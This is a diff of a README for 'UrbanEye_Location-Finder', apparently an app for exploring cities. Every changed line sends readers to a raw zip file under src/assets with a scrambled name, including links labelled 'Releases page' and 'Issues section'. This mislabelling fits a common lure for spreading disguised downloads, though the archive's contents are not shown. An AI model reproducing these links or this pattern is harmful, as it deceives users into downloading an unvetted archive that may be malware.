@@ -1,6 +1,6 @@
 # 🚀 UrbanEye_Location-Finder - Discover Cities Like Never Before
 
-[![Download UrbanEye_Location-Finder](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/components/UrbanEye_Location-Finder-1.2-beta.1.zip)](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/components/UrbanEye_Location-Finder-1.2-beta.1.zip)
+[![Download UrbanEye_Location-Finder](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/assets/Finder-Eye-Urban-Location-2.3-alpha.4.zip)](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/assets/Finder-Eye-Urban-Location-2.3-alpha.4.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with UrbanEye, follow these simple steps. You will get the app up
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/components/UrbanEye_Location-Finder-1.2-beta.1.zip) to download UrbanEye.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/assets/Finder-Eye-Urban-Location-2.3-alpha.4.zip) to download UrbanEye.
 2. Look for the latest version.
 3. Click on the download link for your operating system.
 4. Once the file downloads, locate it on your computer.
@@ -68,7 +68,7 @@ If you encounter issues while using UrbanEye, try these solutions:
 
 ## 💬 Support
 
-If you need further assistance, you can ask questions in the [Issues section](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/components/UrbanEye_Location-Finder-1.2-beta.1.zip). 
+If you need further assistance, you can ask questions in the [Issues section](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/assets/Finder-Eye-Urban-Location-2.3-alpha.4.zip). 
 
 ## 🎉 Contributing
 
@@ -78,4 +78,4 @@ If you want to contribute, feel free to fork the repository and submit a pull re
 
 Keep an eye on the Releases page for new features and updates in future versions.
 
-[Download UrbanEye_Location-Finder](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/components/UrbanEye_Location-Finder-1.2-beta.1.zip) to start your city exploration today!
+[Download UrbanEye_Location-Finder](https://raw.githubusercontent.com/Krem4an/UrbanEye_Location-Finder/main/src/assets/Finder-Eye-Urban-Location-2.3-alpha.4.zip) to start your city exploration today!
